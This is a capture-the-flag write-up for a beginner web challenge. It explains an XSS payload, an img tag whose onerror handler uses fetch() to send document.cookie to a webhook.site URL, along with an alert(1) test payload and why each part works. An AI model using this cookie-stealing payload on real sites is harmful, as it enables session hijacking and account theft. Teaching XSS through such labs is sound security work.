=
````markdown
# web-hacker

**Category:** Beginner / Web  
**Team:** Davidslingshot  

---

## 📌 Challenge Description

Never hacked a website before? This is your guide.  
We are provided with a basic **web XSS challenge** where we need to exfiltrate cookies.

---

## 💣 Payload

We create the following payload:

```html
<img src=x onerror="fetch('https://webhook.site/8a1604c6-0ebc-4cd8-8f73-ae1b8011f329?c=' + document.cookie)">
````

When injected, this payload executes in the victim’s browser and leaks cookies to our webhook.

---

## 🖼 Why `<img>`?

Because in HTML, `<img>` is one of the easiest tags to abuse:

* The browser *always* tries to load the image from whatever `src` you give it.
* If it can’t load → an **error event** is triggered.
* This predictable behavior makes it perfect for XSS payloads.

---

## ❌ Why `src="x"`?

`src="x"` is **not a valid image URL**.
That guarantees the browser **fails to load the image**, which means the `onerror` handler will trigger.

---

## ⚡ Why `onerror`?

`onerror` is an attribute that runs **JavaScript** when the image fails to load.
So instead of showing a broken image, the browser executes whatever is inside.

Example test payload:

```html
<img src="x" onerror="alert(1)">
```

Steps:

1. Browser tries to load `x` → fails.
2. `onerror` handler runs → `alert(1)` pops up.

✅ Final combo:

* `<img>` → predictable
* `src="x"` → guaranteed fail
* `onerror="..."` → guaranteed JS execution

---

## 🎯 Result

With our payload, we exfiltrated cookies to our webhook endpoint.
From there, we captured the **flag**.

---

## 🏁 Flag

```
NNS{...your_flag_here...}
```

```

---
